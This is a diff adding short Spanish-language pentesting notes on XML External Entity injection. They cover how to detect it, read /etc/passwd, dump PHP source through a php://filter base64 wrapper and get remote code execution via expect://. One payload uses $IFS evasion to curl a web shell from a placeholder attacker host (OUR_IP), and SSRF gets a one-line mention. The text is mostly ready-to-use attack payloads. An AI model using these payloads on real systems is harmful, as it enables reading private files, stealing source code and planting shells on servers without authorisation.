@@ -1,0 +1,46 @@
+Siempre agregar las entidades luego de la declaración del XML!!!
+
+################# Idenificación
+
+CUando encontramos alguna request que posea un xml, primero vemos si alguno de los datos de la misma se ve reflejado en la response.
+Luego inyectamos en ese dato una nueva entidad:
+
+<!DOCTYPE "nombre" [
+  <!ENTITY "variable" "dato de la entidad">
+]>
+
+Para llamar a la nueva entidad rellenamos el campo del xml con "&variable;" 
+Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo mostrará &variable;
+
+
+######## Leer archivos del sistema:
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+
+######## Obtener el código de la página php:
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+
+######## RCE:
+1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"
+
+2)Podemos generar una injección de una shell:
+a)creamos la shell.php
+b)Levantamos un servidor
+c) inyectamos el siguiente código:
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+
+
+#########ssrf
+podemos injectar ssrfs en el xml con el fin de alcanzar servicios internos no expuestos.
